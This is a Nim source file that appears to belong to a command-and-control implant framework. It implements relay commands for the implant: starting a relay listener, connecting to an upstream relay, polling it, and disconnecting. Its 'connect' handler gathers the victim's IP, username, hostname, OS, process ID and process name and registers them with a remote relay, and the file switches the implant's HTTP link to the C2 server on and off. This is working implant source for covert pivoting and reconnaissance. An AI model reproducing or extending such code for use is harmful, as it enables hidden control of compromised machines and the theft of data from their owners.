import strutils, json, times
import ../../core/relay/[relay_protocol, relay_comm, relay_config]
import ../../util/[strenc, sysinfo]

# Global relay state using relay_comm.nim types - NO MORE DIRECT SOCKETS!
var g_relayServer*: RelayServer
var upstreamRelay*: RelayConnection
var isConnectedToRelay* = false

# Helper functions for main.nim compatibility
proc isRelayServer*(): bool = g_relayServer.isListening
proc relayServerPort*(): int = g_relayServer.port
proc getRelayConnections*(): int = 
    let stats = getConnectionStats(g_relayServer)
    return stats.connections

# Process relay commands - USING SAFE relay_comm.nim FUNCTIONS
proc processRelayCommand*(cmd: string): string =
    let parts = cmd.split(" ")
    if parts.len < 2:
        return "Usage: relay <command> [args]"
    
    case parts[1]:
    of "port":
        if parts.len < 3:
            return "Usage: relay port <port_number>"
        
        let port = parseInt(parts[2])
        if g_relayServer.isListening:
            return "Relay server already running on port " & $g_relayServer.port
        
        try:
            when defined debug:
                echo "[DEBUG] 🔧 RELAY COMMANDS: Starting relay server on port " & $port
            
            # USE SAFE FUNCTION FROM relay_comm.nim
            g_relayServer = startRelayServer(port)
            
            when defined debug:
                echo "[DEBUG] 🔧 RELAY COMMANDS: After startRelayServer() call:"
                echo "[DEBUG] 🔧 RELAY COMMANDS: - isListening: " & $g_relayServer.isListening
                echo "[DEBUG] 🔧 RELAY COMMANDS: - port: " & $g_relayServer.port
            
            if g_relayServer.isListening:
                when defined debug:
                    echo "[DEBUG] 🔧 RELAY COMMANDS: ✅ Relay server started successfully!"
                return "Relay server started on port " & $port
            else:
                when defined debug:
                    echo "[DEBUG] 🔧 RELAY COMMANDS: ❌ Relay server failed to start"
                return "Failed to start relay server on port " & $port
        except:
            return "Failed to start relay server: " & getCurrentExceptionMsg()
    
    of "connect":
        if parts.len < 3:
            return "Usage: relay connect relay://ip:port"
        
        let relayUrl = parts[2]
        if not relayUrl.startsWith("relay://"):
            return "Invalid relay URL format. Use: relay://ip:port"
        
        try:
            let cleanUrl = relayUrl.replace("relay://", "").strip(chars = {'"'})
            let urlParts = cleanUrl.split(":")
            if urlParts.len != 2:
                return "Invalid relay URL format"
            
            let host = urlParts[0]
            let port = parseInt(urlParts[1])
            
            if upstreamRelay.isConnected:
                return "Already connected to upstream relay"
            
            # USE SAFE FUNCTION FROM relay_comm.nim
            upstreamRelay = connectToRelay(host, port)
            if upstreamRelay.isConnected:
                isConnectedToRelay = true  # Disable HTTP communication
                
                # Send registration message with complete system info
                let implantID = generateImplantID("IMPLANT")
                let route = @[implantID, "UPSTREAM"]
                
                # Collect system information for relay registration  
                let localIP = getLocalIP()
                let username = getUsername()
                let hostname = getSysHostname()
                let osInfo = getOSInfo()
                let pid = getCurrentPID()
                let processName = getCurrentProcessName()
                
                # Create complete registration data as JSON
                let regData = %*{
                    "implantID": implantID,
                    "localIP": localIP,
                    "username": username,
                    "hostname": hostname,
                    "osInfo": osInfo,
                    "pid": pid,
                    "processName": processName,
                    "timestamp": epochTime().int64,
                    "capabilities": ["relay", "client"],
                    "mode": "relay_connect"
                }
                
                let registerMsg = createMessage(REGISTER, implantID, route, $regData)
                
                if sendMessage(upstreamRelay, registerMsg):
                    when defined debug:
                        echo "[DEBUG] Connected and registered with upstream relay, HTTP communication disabled"
                    return "Connected to upstream relay at " & host & ":" & $port 
                else:
                    return "Connected but failed to register with relay"
            else:
                return "Failed to connect to relay"
        except:
            return "Failed to connect to relay: " & getCurrentExceptionMsg()
    
    of "disconnect":
        if not upstreamRelay.isConnected:
            return "Not connected to any upstream relay"
        
        try:
            # USE SAFE FUNCTION FROM relay_comm.nim
            closeConnection(upstreamRelay)
            isConnectedToRelay = false  # Re-enable HTTP communication
            when defined debug:
                echo "[DEBUG] Disconnected from upstream relay, HTTP communication re-enabled"
            return "Disconnected from upstream relay (HTTP re-enabled)"
        except:
            return "Failed to disconnect: " & getCurrentExceptionMsg()
    
    of "status":
        var status = "=== Relay Status ===\n"
        status &= "Relay Server: " & (if g_relayServer.isListening: "Running on port " & $g_relayServer.port else: "Stopped") & "\n"
        
        let stats = getConnectionStats(g_relayServer)
        status &= "Connected Clients: " & $stats.connections & "\n"
        status &= "Upstream Relay: " & (if upstreamRelay.isConnected: "Connected" else: "Disconnected") & "\n"
        status &= "HTTP to C2: " & (if isConnectedToRelay: "DISABLED (using relay)" else: "ENABLED") & "\n"
        status &= "Protocol: relay_comm.nim (secure)\n"
        return status
    
    of "stop":
        if not g_relayServer.isListening:
            return "Relay server is not running"
        
        try:
            # USE SAFE FUNCTION FROM relay_comm.nim
            closeRelayServer(g_relayServer)
            return "Relay server stopped (secure shutdown)"
        except:
            return "Failed to stop relay server: " & getCurrentExceptionMsg()
    
    else:
        return "Unknown relay command. Available: port, connect, disconnect, status, stop"

# Poll relay server for new messages - USING SAFE FUNCTIONS
proc pollRelayServerMessages*(): seq[RelayMessage] =
    if not g_relayServer.isListening:
        return @[]
    
    try:
        # USE SAFE FUNCTION FROM relay_comm.nim - NO MORE BUFFER OVERFLOW!
        return pollRelayServer(g_relayServer, 10)  # 10ms timeout for non-blocking
    except:
        when defined debug:
            echo "[DEBUG] Error polling relay server messages"
        return @[]

# Poll upstream relay for messages - USING SAFE FUNCTIONS
proc pollUpstreamRelayMessages*(): seq[RelayMessage] =
    when defined debug:
        echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Checking connection status: " & $upstreamRelay.isConnected
    
    if not upstreamRelay.isConnected:
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Not connected, returning empty array"
        return @[]
    
    try:
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Calling pollMessages with 10ms timeout"
        
        # USE SAFE FUNCTION FROM relay_comm.nim
        let messages = pollMessages(upstreamRelay, 10)  # 10ms timeout for non-blocking
        
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Got " & $messages.len & " messages"
        
        return messages
    except Exception as e:
        when defined debug:
            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Error polling upstream relay messages: " & e.msg
        upstreamRelay.isConnected = false
        return @[]

# Cleanup dead connections - USING SAFE FUNCTIONS
proc cleanupRelayConnections*() =
    if g_relayServer.isListening:
        cleanupConnections(g_relayServer) 